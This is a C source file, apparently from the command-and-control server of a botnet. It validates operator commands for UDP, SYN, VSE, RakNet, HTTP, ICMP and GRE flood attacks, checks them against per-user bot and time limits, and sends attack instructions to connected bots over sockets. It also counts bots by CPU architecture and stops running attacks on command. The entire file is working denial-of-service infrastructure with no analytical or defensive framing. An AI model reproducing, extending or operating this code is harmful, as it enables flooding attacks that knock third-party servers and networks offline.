#include "headers/command_actions.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include <string.h>
#include <stdio.h>
#include <pthread.h>

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 ||
           strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!vse", 4) == 0 ||
           strncmp(command, "!raknet", 7) == 0 ||
           strncmp(command, "!http", 5) == 0 ||
           strncmp(command, "!socket", 7) == 0 ||
           strncmp(command, "!icmp", 5) == 0 ||
           strncmp(command, "!gre", 4) == 0 ||
           strncmp(command, "!udpplain", 9) == 0;
}

void handle_layer3_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char proto[8];
    static char bot_command[MAX_COMMAND_LENGTH];
    static char *args[32];
    static int time, psize, botcount, gport, srcport;
    static int has_psize, has_botcount, has_proto, has_gport, has_srcport;
    static int arg_count;
    static int is_icmp, is_gre;
    
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    memset(proto, 0, sizeof(proto));
    memset(args, 0, sizeof(args));
    time = psize = botcount = gport = srcport = 0;
    has_psize = has_botcount = has_proto = has_gport = has_srcport = 0;
    arg_count = 0;
    is_icmp = is_gre = 0;

    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
        if (strncmp(cmd, "!gre", 4) == 0)
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
        else
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
        return;
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    if (strncmp(cmd, "!icmp", 5) == 0) {
        is_icmp = 1;
    } else if (strncmp(cmd, "!gre", 4) == 0) {
        is_gre = 1;
        psize = 32;
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (is_gre) {
                if (psize <= 0 || psize > 8192) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize MUST be 1-8192 for gre\033[0m\n");
                    return;
                }
            } else {
                if (!validate_psize(psize, cmd)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                    return;
                }
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else if (is_gre && strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport option\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (need int)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (!validate_srcport(srcport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_srcport = 1;
        } else if (is_gre && strncmp(args[i], "proto=", 6) == 0) {
            if (has_proto) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate proto option\033[0m\n");
                return;
            }
            strncpy(proto, args[i] + 6, sizeof(proto) - 1);
            proto[sizeof(proto) - 1] = '\0';
            if (strcmp(proto, "tcp") != 0 && strcmp(proto, "udp") != 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid proto value, must be tcp or udp\033[0m\n");
                return;
            }
            has_proto = 1;
        } else if (is_gre && strncmp(args[i], "gport=", 6) == 0) {
            if (has_gport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate gport argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport (need int)\033[0m\n");
                return;
            }
            gport = atoi(val);
            if (!validate_port(gport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_gport = 1;
        } else if (!is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        } else if (is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    if (is_gre) {
        if (has_proto && !has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mgport= is required when proto= is set\033[0m\n");
            return;
        }
        if (!has_proto && has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using gport=\033[0m\n");
            return;
        }
        if (has_srcport && !has_proto) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using srcport=\033[0m\n");
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        if (botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
            pthread_mutex_unlock(&bot_mutex);
            return;
        }
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }

    int sent_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_gre) {
                if (has_proto && has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", 
                            cmd, ip, time, psize, proto, gport, srcport);
                else if (has_proto)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", 
                            cmd, ip, time, psize, proto, gport);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
            } else {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            }
            
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void handle_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char *args[32];
    static char bot_command[MAX_COMMAND_LENGTH];
    int port = 0, time = 0, srcport = 0, psize = 0, botcount = 0;
    int has_srcport = 0, has_psize = 0, has_botcount = 0;
    int arg_count = 0;
    int is_icmp = strcmp(command, "!icmp") == 0;

    memset(argstr, 0, sizeof(argstr));
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(args, 0, sizeof(args));

    if (is_icmp) {
        if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !icmp <ipv4> <time> [options]\033[0m\n");
            return;
        }
    } else {
        if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr) < 4) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !method <ipv4> <dport> <time> [options]\033[0m\n");
            return;
        }
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (!is_icmp && !validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid port\033[0m\n");
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport argument\033[0m\n");
                return;
            }
            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31msrcport not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (not an integer)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (srcport > 0) {
                if (!validate_srcport(srcport)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport!\033[0m\n");
                    return;
                }
            }
            has_srcport = 1;
        } else if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || 
                strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0 || is_icmp)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                return;
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }
    int sent_bots = 0;
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_icmp) {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            } else {
                if (has_srcport && has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d psize=%d", cmd, ip, port, time, srcport, psize);
                else if (has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d", cmd, ip, port, time, srcport);
                else if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d", cmd, ip, port, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
            }
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void handle_bots_command(char *response) {
    static int arch_count[13];
    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "m68k", "i686", "sparc", "powerpc64", "sh4", "armhf", "arc700", "unknown"};
    static int valid_bots;
    int offset;
    
    memset(arch_count, 0, sizeof(arch_count));
    valid_bots = 0;
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        valid_bots++;
        int found = 0;
        for (int j = 0; j < 13 && !found; j++) {
            if (strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) {
            arch_count[11]++; 
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Total bots: %d\n" RESET, valid_bots);
    for (int i = 0; i < 14; i++) {
        if (arch_count[i] > 0) {
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, CYAN "\r%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
        }
    }
}

void handle_stopall_command(const User *user, char *response) {
    static int allow_stopall;
    static int stopped_count;
    static const char stop_cmd[] = "stop";
    
    allow_stopall = 0;
    stopped_count = 0;
    
    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("database/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, "\r" RED "Error: You don't have permission to use !stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                stopped_count++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
    
    snprintf(response, MAX_COMMAND_LENGTH, "\r" PINK "Sent stop command to %d active bots\n" RESET, stopped_count);
}
